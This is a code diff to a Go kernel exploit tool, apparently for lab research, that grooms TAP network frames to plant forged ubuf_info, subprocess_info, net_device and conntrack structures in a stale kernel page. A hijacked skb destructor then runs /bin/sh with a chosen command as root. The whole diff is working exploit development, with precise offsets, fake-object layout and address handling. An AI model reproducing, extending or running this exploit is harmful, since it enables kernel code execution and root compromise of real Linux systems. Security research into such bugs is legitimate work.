@@ -89,6 +89,8 @@ type cfg struct {
 	staleEach     time.Duration
 	staleHold     bool
 	staleHead     uint64
+	staleSKB      uint64
+	staleDev      uint64
 	staleHeadFile string
 	staleCallback uint64
 	staleCopyLen  int
@@ -136,6 +138,8 @@ func parseCfg() cfg {
 	staleEachUS := flag.Int("stale-groom-each-delay-us", 0, "lab-only: delay after each marker allocation")
 	flag.BoolVar(&c.staleHold, "stale-groom-hold", true, "lab-only: hold marker SKBs in a TAP packet-socket queue until all chunks are allocated")
 	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
+	flag.Uint64Var(&c.staleSKB, "stale-groom-skb", 0, "lab-only: optional observed victim sk_buff address for calibration diagnostics")
+	flag.Uint64Var(&c.staleDev, "stale-groom-dev", 0, "lab-only: optional observed victim net_device address for calibration diagnostics")
 	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
 	flag.Uint64Var(&c.staleCallback, "stale-groom-callback", 0, "lab-only: fake ubuf_info completion callback address")
 	flag.IntVar(&c.staleCopyLen, "stale-copy-len", 0, "lab-only: terminate fake ubuf_info after this many non-NUL bytes for a strcpy callback")
@@ -345,38 +349,47 @@ func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 		return fmt.Errorf("stale-options probe stage: %w", err)
 	}
 	fmt.Printf("stale-options: probe ready; write the observed victim head to %s\n", c.staleHeadFile)
-	head, err := waitForKernelAddress(c.staleHeadFile, 30*time.Second)
+	addresses, err := waitForKernelAddresses(c.staleHeadFile, 30*time.Second)
 	if err != nil {
 		return err
 	}
 	attack := c
-	attack.staleHead = head
+	attack.staleHead = addresses[0]
+	if len(addresses) >= 3 {
+		attack.staleSKB = addresses[1]
+		attack.staleDev = addresses[2]
+	}
 	attack.staleHeadFile = ""
 	// The probe leaves its victim page cached in this task_frag. Eight
 	// 3840-byte held grooms seed that same page without advancing to another.
 	attack.staleGrooms = 8
-	fmt.Printf("stale-options: callback stage head=%#x callback=%#x groom_count=%d\n",
-		attack.staleHead, attack.staleCallback, attack.staleGrooms)
+	fmt.Printf("stale-options: callback stage head=%#x skb=%#x dev=%#x callback=%#x groom_count=%d\n",
+		attack.staleHead, attack.staleSKB, attack.staleDev, attack.staleCallback, attack.staleGrooms)
 	return runStaleOptionsAttempt(tap, cap, attack)
 }
 
-func waitForKernelAddress(path string, timeout time.Duration) (uint64, error) {
+func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error) {
 	deadline := time.Now().Add(timeout)
 	for time.Now().Before(deadline) {
 		data, err := os.ReadFile(path)
 		if err == nil && strings.TrimSpace(string(data)) != "" {
-			value, parseErr := strconv.ParseUint(strings.TrimSpace(string(data)), 0, 64)
-			if parseErr != nil {
-				return 0, fmt.Errorf("parse victim head from %s: %w", path, parseErr)
+			fields := strings.Fields(string(data))
+			values := make([]uint64, 0, len(fields))
+			for _, field := range fields {
+				value, parseErr := strconv.ParseUint(field, 0, 64)
+				if parseErr != nil {
+					return nil, fmt.Errorf("parse victim addresses from %s: %w", path, parseErr)
+				}
+				values = append(values, value)
 			}
-			return value, nil
+			return values, nil
 		}
 		if err != nil && !errors.Is(err, os.ErrNotExist) {
-			return 0, fmt.Errorf("read victim head from %s: %w", path, err)
+			return nil, fmt.Errorf("read victim head from %s: %w", path, err)
 		}
 		time.Sleep(20 * time.Millisecond)
 	}
-	return 0, fmt.Errorf("timed out waiting for victim head in %s", path)
+	return nil, fmt.Errorf("timed out waiting for victim head in %s", path)
 }
 
 func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
@@ -394,7 +407,7 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 			}
 		}
 		for i := 0; i < c.staleGrooms; i++ {
-			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
+			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleSKB, c.staleDev, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
 			if err != nil {
 				if hold != nil {
 					hold.Close()
@@ -485,7 +498,7 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 	return nil
 }
 
-func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
+func stalePageGroomFrame(fill byte, victimHead, _, _, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
 	// 3456 is the largest convenient frame that still passes tun_can_build_skb's
 	// PAGE_SIZE eligibility check, which includes TUN_RX_PAD, XDP headroom, and
 	// skb_shared_info. With no XDP program the actual task_frag chunk is 3840
@@ -510,9 +523,12 @@ func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, ex
 			// this avoids NUL bytes in its page-relative address and makes the
 			// callback pointer overlap the unused cleanup field of the fake
 			// subprocess_info. The overwritten skb destructor at source+96
-			// invokes call_usermodehelper_exec_async(skb).
+			// invokes call_usermodehelper_exec_async(skb). Copy through skb->len
+			// at offset 112 so ____dev_forward_skb rejects and frees the skb
+			// immediately, before the receive path reuses skb->cb (which holds
+			// subprocess_info.path/argv/envp in the copied prefix).
 			fakeOps = fakeUarg + 80
-			copyLen = 104
+			copyLen = 116
 		}
 		if copyLen != 0 && execAsync == 0 {
 			// Offset 0x111 avoids NUL bytes in the little-endian pointer
@@ -536,11 +552,14 @@ func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, ex
 		binary.LittleEndian.PutUint64(frame[opsAt+8:opsAt+16], 0)
 		if execAsync != 0 {
 			const (
-				pathOff  = 0x511
-				dashCOff = 0x531
-				cmdOff   = 0x551
-				argvOff  = 0x711
-				envpOff  = 0x791
+				pathOff     = 0x511
+				dashCOff    = 0x531
+				cmdOff      = 0x551
+				argvOff     = 0x711
+				envpOff     = 0x791
+				completeOff = 0x820
+				fakeDevOff  = 0x911
+				fakeCTOff   = 0xb10
 			)
 			uargAt := fakeUarg - 64
 			put64 := func(sourceOff int, value uint64) {
@@ -550,6 +569,17 @@ func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, ex
 				copy(frame[headOff-64:], value)
 			}
 			put64(0, victimHead+fakeOps)
+			put64(8, victimHead+0x311)
+			// strcpy replaces skb->dev at destination offset 16. A real,
+			// aligned net_device pointer contains NUL bytes and cannot appear
+			// inside the source string, so point it at controlled page data.
+			// dev_net() only reads nd_net for a pointer comparison, and
+			// eth_type_trans() replaces skb->dev with the real receiving device
+			// immediately afterwards. The all-fill fake object intentionally
+			// makes the comparison request the cross-netns scrub path.
+			put64(16, victimHead+fakeDevOff)
+			put64(24, victimHead+0x331)
+			put64(32, victimHead+completeOff)
 			put64(40, victimHead+pathOff)
 			put64(48, victimHead+argvOff)
 			put64(56, victimHead+envpOff)
@@ -558,9 +588,15 @@ func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, ex
 			put64(80, callback)
 			put64(88, victimHead+cmdOff)
 			put64(96, execAsync)
+			// skb_release_head_state runs nf_reset_ct after the destructor.
+			// The prefix must therefore carry a non-NUL, safely refcounted
+			// _nfct value. Low three bits are flags and are masked before the
+			// controlled nf_conntrack.use field is decremented.
+			put64(104, victimHead+fakeCTOff+1)
+			binary.LittleEndian.PutUint32(frame[uargAt+112:uargAt+116], 0x7f7f7f7f)
 			frame[uargAt+copyLen] = 0
-			if bytes.IndexByte(frame[uargAt:uargAt+copyLen], 0) >= 0 {
-				return nil, fmt.Errorf("fake subprocess_info contains a NUL before byte %d for head %#x", copyLen, victimHead)
+			if nulAt := bytes.IndexByte(frame[uargAt:uargAt+copyLen], 0); nulAt >= 0 {
+				return nil, fmt.Errorf("fake subprocess_info contains a NUL at byte %d before terminator %d for head %#x", nulAt, copyLen, victimHead)
 			}
 
 			putHead(pathOff, append([]byte("/bin/sh"), 0))
@@ -572,6 +608,14 @@ func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, ex
 			binary.LittleEndian.PutUint64(frame[argvAt+16:argvAt+24], victimHead+cmdOff)
 			binary.LittleEndian.PutUint64(frame[argvAt+24:argvAt+32], 0)
 			binary.LittleEndian.PutUint64(frame[envpOff-64:envpOff-56], 0)
+			completeAt := completeOff - 64
+			// struct completion: done=0, unlocked swait head, empty list.
+			for i := 0; i < 16; i++ {
+				frame[completeAt+i] = 0
+			}
+			binary.LittleEndian.PutUint64(frame[completeAt+16:completeAt+24], victimHead+completeOff+16)
+			binary.LittleEndian.PutUint64(frame[completeAt+24:completeAt+32], victimHead+completeOff+16)
+			binary.LittleEndian.PutUint32(frame[fakeCTOff-64:fakeCTOff-60], 0x02020202)
 		}
 	}
 	return frame, nil
